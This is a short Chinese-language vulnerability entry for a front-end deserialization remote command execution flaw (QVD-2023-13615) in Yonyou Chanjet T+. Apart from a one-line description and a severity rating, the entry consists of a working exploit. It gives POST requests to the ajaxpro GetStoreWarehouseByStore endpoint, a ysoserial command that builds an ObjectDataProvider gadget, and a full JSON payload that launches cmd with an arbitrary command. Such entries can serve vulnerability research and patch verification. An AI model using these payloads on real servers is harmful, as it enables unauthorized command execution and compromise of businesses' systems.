# 用友 畅捷通 T+ 前台远程命令执行漏洞 QVD-2023-13615

## 漏洞描述
由于用友畅捷通 T+前台存在反序列化漏洞，恶意攻击者成功利用此漏洞可在目标服务器上执行任意命令。

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
poc

```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: your-ip
X-Ajaxpro-Method: GetStoreWarehouseByStore
 
{
  "storeID":{}
}

## Payloads
```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: your-ip
X-Ajaxpro-Method: GetStoreWarehouseByStore
 
{
  "storeID":{}
}
```
```
./ysoserial.exe -f JavaScriptSerializer -g ObjectDataProvider -c "执行的命令"
```
```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: your-ip
X-Ajaxpro-Method: GetStoreWarehouseByStore
 
{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c 执行的命令"
        }
    }
  }
}
```
